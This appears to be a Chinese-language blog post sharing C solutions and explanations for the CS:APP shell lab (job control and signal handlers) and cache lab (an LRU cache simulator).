<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">checkDigit</span><span class="params">(<span class="keyword">char</span>* s)</span></span>&#123;</span><br><span class="line">    <span class="comment">//检测输入的参数是否满足，全为数字，或是%数字的形式</span></span><br><span class="line">	<span class="comment">//如果参数满足则返回1，如果参数不正确则返回0	</span></span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">&#x27;%&#x27;</span> || (s[<span class="number">0</span>]&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; s[<span class="number">0</span>]&lt;=<span class="string">&#x27;9&#x27;</span>));</span><br><span class="line">    <span class="keyword">else</span>    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]&lt;<span class="string">&#x27;0&#x27;</span> || s[i]&gt;<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span>* <span class="title">str2job</span><span class="params">(<span class="keyword">char</span>* s)</span></span>&#123; </span><br><span class="line">    <span class="comment">//将fg，bg的参数转换为对应的jid或pid</span></span><br><span class="line">    <span class="keyword">int</span> jid;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">jPtr</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">        jid=atoi(&amp;s[<span class="number">1</span>]);</span><br><span class="line">        jPtr=getjobjid(jobs,jid);</span><br><span class="line">        <span class="keyword">if</span>(jPtr==<span class="literal">NULL</span>)&#123;  <span class="comment">//jid不存在</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: No such job\n&quot;</span>,s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        pid=atoi(s);</span><br><span class="line">        jPtr=getjobpid(jobs,pid);</span><br><span class="line">        <span class="keyword">if</span>(jPtr==<span class="literal">NULL</span>)&#123;  <span class="comment">//pid不存在</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%s): No such process\n&quot;</span>,s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jPtr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)&#123;  <span class="comment">//没有输入jid</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!checkDigit(argv[<span class="number">1</span>]))&#123;  <span class="comment">//输入的jid中含有非数字元素</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span>* <span class="title">jPtr</span>=<span class="title">str2job</span>(<span class="title">argv</span>[1]);</span></span><br><span class="line">    <span class="keyword">if</span>(jPtr==<span class="literal">NULL</span>)  <span class="keyword">return</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;bg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-jPtr-&gt;pid,SIGCONT)&lt;<span class="number">0</span>)  <span class="comment">//发送给整个进程组，而不是单个进程</span></span><br><span class="line">            unix_error(<span class="string">&quot;kill bg error:&quot;</span>);</span><br><span class="line">        jPtr-&gt;state=BG;         <span class="comment">//修改作业状态</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>,jPtr-&gt;jid,jPtr-&gt;pid,jPtr-&gt;cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-jPtr-&gt;pid,SIGCONT)&lt;<span class="number">0</span>) <span class="comment">//发送给整个进程组，而不是单个进程</span></span><br><span class="line">            unix_error(<span class="string">&quot;kill fg error:&quot;</span>);</span><br><span class="line">        jPtr-&gt;state=FG;      <span class="comment">//修改作业状态</span></span><br><span class="line">        waitfg(jPtr-&gt;pid);   <span class="comment">//等待这个前台进程终止</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h3><p>对SIGCHLD的信号处理也是本次实验的主要内容，同样可以参照书本的样例代码，并在此之上做进一步的改进。</p>
<p>首先是waitpid，一定要加上WNOHANG和WUNTRACED这两个参数，WNOHANG可以告诉主进程无需挂起等待子进程结束，而WUNTRACED则会在子进程进入暂停状态时，返回信息。</p>
<p>上面的waitfg中使用了一个标志前台进程的全局变量waitPidMark来实现对前台进程的显式等待。在SIGCHLD的处理程序中，每当一个子进程结束时，需要检验这个进程是不是前台进程，如果是的话需要修改waitPidMark，这样waitfg才能知道前台进程已经结束，它应该返回了。</p>
<p>另一方面，对于waitpid的返回值，也需要判断这个进程是结束了还是暂停了，并且针对进程状态输出对应的提示信息。</p>
<p>下面是我的sigchld_handler代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno=errno;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">int</span> jid;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all,prev_all;</span><br><span class="line">    <span class="keyword">pid_t</span> tmpCheck;</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    <span class="comment">//WNOHANG | WUNTRACED必须加上，否则就会将进程挂起等待子进程终止</span></span><br><span class="line">    <span class="comment">//在trace05中会使得后续进程等待很长时间</span></span><br><span class="line">    <span class="keyword">while</span>((tmpCheck=waitpid(<span class="number">-1</span>,&amp;status,WNOHANG | WUNTRACED))&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">        <span class="keyword">if</span>(tmpCheck==fgpid(jobs))    waitPidMark=<span class="number">0</span>;  <span class="comment">//确定终止进程是否是前台进程</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(WIFSTOPPED(status))&#123; <span class="comment">//返回的子进程停止，则在作业集中修改它的状态</span></span><br><span class="line">            jid=pid2jid(tmpCheck);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>,jid,tmpCheck,WSTOPSIG(status));</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span>* <span class="title">jPtr</span>=<span class="title">getjobpid</span>(<span class="title">jobs</span>,<span class="title">tmpCheck</span>);</span></span><br><span class="line">            jPtr-&gt;state=ST;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  <span class="comment">//如果返回子进程终止，则从作业集中删除它</span></span><br><span class="line">        <span class="comment">//注意不能只在WIFSIGNALED的条件语句中调用deletejob</span></span><br><span class="line">        <span class="comment">//只要子进程结束了，都应该调用deletejob</span></span><br><span class="line">            <span class="keyword">if</span>(WIFSIGNALED(status))&#123;</span><br><span class="line">                jid=pid2jid(tmpCheck);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>,jid,tmpCheck,WTERMSIG(status));</span><br><span class="line">                <span class="comment">//打印出进程终止原因</span></span><br><span class="line">                deletejob(jobs,tmpCheck); <span class="comment">//删除作业</span></span><br><span class="line">            &#125;</span><br><span class="line">            deletejob(jobs,tmpCheck); <span class="comment">//删除作业</span></span><br><span class="line">        &#125;</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    errno=olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="sigint-handler和sigtstp-handler"><a href="#sigint-handler和sigtstp-handler" class="headerlink" title="sigint_handler和sigtstp_handler"></a>sigint_handler和sigtstp_handler</h3><p>最后是对SIGINT和SIGTSTP的信号处理函数，这两个信号处理函数的内容很简单也非常相似，所以就放在一起说明了。</p>
<p>这一部分唯一需要注意的是使用kill发送信号时，参数需要使用-pid，而不是pid。因为SIGINT和SIGTSTP需要被发送给整个前台进程组，都不是单个进程。测试程序会检测这方面的内容。</p>
<p>下面是我的sigint_handler和sigtstp_handler代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno=errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all,prev_all;</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">    <span class="keyword">pid_t</span> fgp=fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span>(kill(-fgp,SIGINT)&lt;<span class="number">0</span>)&#123;  <span class="comment">//发送给前台进程组</span></span><br><span class="line">        unix_error(<span class="string">&quot;kill sigint error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">    errno=olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno=errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all,prev_all;</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">    <span class="keyword">pid_t</span> fgp=fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span>(kill(-fgp,SIGTSTP)&lt;<span class="number">0</span>)&#123; <span class="comment">//发送给前台进程组</span></span><br><span class="line">        unix_error(<span class="string">&quot;kill sigtstp error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">    errno=olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>至此，shell lab就做完了。本次实验与书本上的内容结合的更加紧密，对于一些机制的实现，书本上都有非常详细的讨论和解释。通过这次实验，让我更加深刻理解了信号的作用，以及一个shell程序的大致执行流程。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/30/csapp-cacheLab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.png">
      <meta itemprop="name" content="wwow">
      <meta itemprop="description" content="努力可能会成功，但不努力真的很舒服">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wwow's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/30/csapp-cacheLab/" class="post-title-link" itemprop="url">csapp-cacheLab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-08-30 00:02:59" itemprop="dateCreated datePublished" datetime="2020-08-30T00:02:59+08:00">2020-08-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-09-04 22:32:20" itemprop="dateModified" datetime="2020-09-04T22:32:20+08:00">2020-09-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/csapp/" itemprop="url" rel="index"><span itemprop="name">csapp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="csapp-cacheLab"><a href="#csapp-cacheLab" class="headerlink" title="csapp-cacheLab"></a>csapp-cacheLab</h2><p>在开始实验时请认真阅读实验的指导书，其中关于实验的注意点和要求都写的非常明确，这些内容在本篇文章中不会提及。</p>
<p><a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/cachelab.pdf">http://csapp.cs.cmu.edu/3e/cachelab.pdf</a></p>
<h4 id="PartA"><a href="#PartA" class="headerlink" title="PartA"></a>PartA</h4><p>第一部分要求我们编写一个cache的模拟器，通过在运行程序时提供参数确定cache的参数(E–&gt;行数，s–&gt;索引位长，b–&gt;存储块的位长)，然后顺序读取测试文件中提供的64位内存地址序列，最后输出在这一过程中的hit,miss,evicts</p>
<p>压缩包中提供了一个二进制文件csim-ref，这个文件就是我们的参照，我们程序的运行结果需要和它完全相同。</p>
<p>首先是存储cache参数的数据结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">cacheInfo_</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> S;  <span class="comment">//组数</span></span><br><span class="line">    <span class="keyword">int</span> E;  <span class="comment">//行数</span></span><br><span class="line">    <span class="keyword">int</span> B;  <span class="comment">//块大小（字节）</span></span><br><span class="line">    <span class="keyword">int</span> m;  <span class="comment">//物理地址位数，64</span></span><br><span class="line">    <span class="keyword">int</span> s_bit;  <span class="comment">//组索引位数</span></span><br><span class="line">    <span class="keyword">int</span> b_bit;  <span class="comment">//块偏移位数</span></span><br><span class="line">    <span class="keyword">int</span> t_bit;  <span class="comment">//标记位数</span></span><br><span class="line">&#125;cacheInfo;</span><br></pre></td></tr></table></figure>

<p>然后我们需要处理程序的命令行参数，使用getopt函数（writeup里有提示）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>((ch=getopt(argc,argv,<span class="string">&quot;hvs:E:b:t:&quot;</span>))!=<span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">switch</span>(ch)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            print_help_info();  <span class="comment">//打印对该程序的使用指南</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            verbose_flag=<span class="number">1</span>;   <span class="comment">//修改标志位</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            cacheInfo.s_bit=atoi(optarg);</span><br><span class="line">            cacheInfo.S=<span class="number">1</span>&lt;&lt;cacheInfo.s_bit;  </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            cacheInfo.E=atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            cacheInfo.b_bit=atoi(optarg);</span><br><span class="line">            cacheInfo.B=<span class="number">1</span>&lt;&lt;cacheInfo.b_bit;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            fp=fopen(optarg,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Unknown option: %c\n&quot;</span>,(<span class="keyword">char</span>)optopt);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后需要定义cache的存储内容，为了逻辑清晰可以再定义一个结构来整合这些信息，但是这只是一个小程序，我就直接使用三个二维数组将cache的信息分开存放了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   cache=(<span class="keyword">long</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">long</span>*)*cacheInfo.S);  </span><br><span class="line"><span class="comment">//分配地址空间模拟cache, [索引组][行数]---&gt;标志位</span></span><br><span class="line">   mark=(<span class="keyword">bool</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">bool</span>*)*cacheInfo.S);   </span><br><span class="line"><span class="comment">//对应每一组内每一行的有效位,[索引组][行数]---&gt;有效位</span></span><br><span class="line">   time_tag=(<span class="keyword">int</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>*)*cacheInfo.S); </span><br><span class="line"><span class="comment">//时间标记,[索引组][行数]---&gt;时间戳(用于LRU算法的替换依据)</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cacheInfo.S;i++)&#123;                <span class="comment">//初始化</span></span><br><span class="line">       cache[i]=(<span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">long</span>)*cacheInfo.E);</span><br><span class="line">       mark[i]=(<span class="keyword">bool</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">bool</span>)*cacheInfo.E);</span><br><span class="line">       time_tag[i]=(<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*cacheInfo.E);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cacheInfo.S;i++)&#123;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;cacheInfo.E;j++)</span><br><span class="line">           mark[i][j]=<span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>然后就是处理实际的地址访问请求的函数，这里我写一些伪代码说明流程，具体实现还是大家自己思考。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(读入一个memory traces)&#123;</span><br><span class="line">	判断它的类型，如果是I(I类指令最前面没有空格，其他指令前面有空格)则不用处理，<span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line">    取出memory traces的内存地址，将其转换为<span class="keyword">long</span></span><br><span class="line">        </span><br><span class="line">    将内存地址划分为组索引saddr和有效位taddr，块内偏移量可以忽略(writeup中有提示)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">for</span>(遍历cache数组和mark数组)&#123;</span><br><span class="line">    	<span class="keyword">if</span>(mark[saddr][row]=<span class="literal">true</span>,且cache[saddr][row]=taddr) <span class="comment">//cache中保存有对应的内存单元</span></span><br><span class="line">    	then </span><br><span class="line">        	hit++;</span><br><span class="line">        	更新time[saddr][row]的时间戳;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(cache中没有找到对应内存单元)&#123;</span><br><span class="line">    	miss++;</span><br><span class="line">        LRU_replacement();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(memory trace type==M)&#123;</span><br><span class="line">    	hit++;  <span class="comment">//M必定发生2次hit或1次hit+1次miss,将缺的一次hit补上</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后需要完善cache的替换策略，本次实验中只需要实现较为简单的LRU策略，LRU策略会将一个最长时间未被使用的内存块换出cache，为了支持这一点，我们使用一个time_targ二维数组来记录每一个索引组中每一行的时间戳，使用全局的整型变量time，每一次对内存的访问都会使得time变量递增并且更新到time_targ[saddr] [row]。在需要替换内存块时，就遍历对应索引组的所有行，找到time[saddr] [row]最小的那一个替换出cache。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LRU_replacement</span><span class="params">(<span class="keyword">long</span> saddr,<span class="keyword">long</span> taddr,<span class="keyword">char</span>* cacheState)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cacheInfo.E;i++)&#123;  <span class="comment">//首先检查有没有空闲的块可以存放读入的内存单元</span></span><br><span class="line">        <span class="keyword">if</span>(!mark[saddr][i])&#123;</span><br><span class="line">            cache[saddr][i]=taddr;</span><br><span class="line">            mark[saddr][i]=<span class="literal">true</span>;</span><br><span class="line">            time_tag[saddr][i]=time++;  <span class="comment">//时间标记，在驱逐的时候会用到它</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> minTime=<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">int</span> minIndex=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;cacheInfo.E;i++)&#123;   <span class="comment">//cache已满，需要驱逐</span></span><br><span class="line">        <span class="keyword">int</span> stamp=time_tag[saddr][i];</span><br><span class="line">        <span class="keyword">if</span>(stamp&lt;minTime)&#123;  <span class="comment">//寻找时间戳最小的那一行换出</span></span><br><span class="line">            minTime=stamp;</span><br><span class="line">            minIndex=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;evicts taddr=%ld saddr=%ld\n&quot;</span>,cache[saddr][minIndex],saddr);</span><br><span class="line">    cache[saddr][minIndex]=taddr;  </span><br><span class="line">    time_tag[saddr][minIndex]=time++;</span><br><span class="line">    evicts++;</span><br><span class="line">    <span class="built_in">strcat</span>(cacheState,<span class="string">&quot; evicts&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，partA的cache模拟器就完成了。</p>
<h3 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h3><p>这一部分只要是编写矩阵转置函数，并且要求在转置过程中发生尽可能少的miss</p>
<p>用于测试的矩阵有三种规格32x32,64x64,61x67，我们可以针对不同规模的矩阵使用专门的转置模式（不这么做也过不了测试）。</p>
<p>下面是对性能评估和分数的情况。</p>
